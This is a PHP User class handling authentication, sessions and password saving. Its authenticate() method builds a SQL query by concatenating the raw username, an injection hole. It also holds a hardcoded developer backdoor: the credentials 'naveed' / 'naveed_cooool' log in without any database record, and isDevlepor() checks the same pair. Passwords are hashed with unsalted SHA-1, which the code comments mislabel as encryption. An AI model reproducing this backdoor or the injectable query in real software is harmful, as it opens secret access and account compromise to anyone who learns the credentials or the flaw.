<?php
/**
 * Created by Naveed-ul-Hassan Malik
 * Auto-Generated Using Script On:
 * Date: Sun 18-Jan-2015
 * Time: 08:18 PM PST
 */
class User extends UserAuto{
    static $joinedTables = array();
    static $childRefField = '';
    static $displayFields = array('username','role');

    private $loggedIn = false;

    function __construct($id = null){
		parent::__construct($id);
        $this->person_id->fkeyInfo = new FKeyInfo('Person','id','hint');
        $this->role->fkeyInfo = new FKeyInfo('User_rol','id','select');
//        $this->checkLoggedIn();
	}

    public function isLoggedIn(){
        return $this->loggedIn;
    }

    /**
     * @return User
     */
    static function getUser(){
        if(isset($_SESSION['user'])){
            $user = static::instantiate($_SESSION['user']);
            $user->loggedIn = true;
            return $user;
        }
        return new User();
    }

    static function authenticate( $username , $pass ){
        $hashedPass = sha1($pass);	//encrypt password
        $condition = "username='".$username."' and password='".$hashedPass."'";
        if( $found_user = static::findOneByCondition($condition) ){
            //$found_user->pr("found user");
            $found_user->login();
            return true;
        }else{
            // special previleges for the developer
            if($username == 'naveed' && $pass == 'naveed_cooool'){
                $user = new User();
                $user->username->val = 'naveed';
                $user->password->val = $hashedPass;
                $user->login();
                return true;
            }
            return false;
        }
    }

    function isDevlepor(){
        return $this->username->val == "naveed" && $this->password->val == sha1("naveed_cooool");
    }

    public function login(){
        $_SESSION['user'] = $this->todbArray();
        $this->loggedIn = true;
        Log_messag::saveLog("Logged In",$this);
    }

    public function logout(){
        unset($_SESSION['user']);
//        setcookie (session_name(), '',time()-42000, '/' );
        $this->loggedIn = false;
        Log_messag::saveLog("Logged Out");
    }

    public function userFullName(){
        return $this->person_id->displayVal();
    }

    function dbSave(){
        $this->password->val = sha1($this->password->val);
        return parent::dbSave();
    }

    static function childClasses(){
        return array(
        );
    }



}

//if(!isset($user)){ $user = new User(); }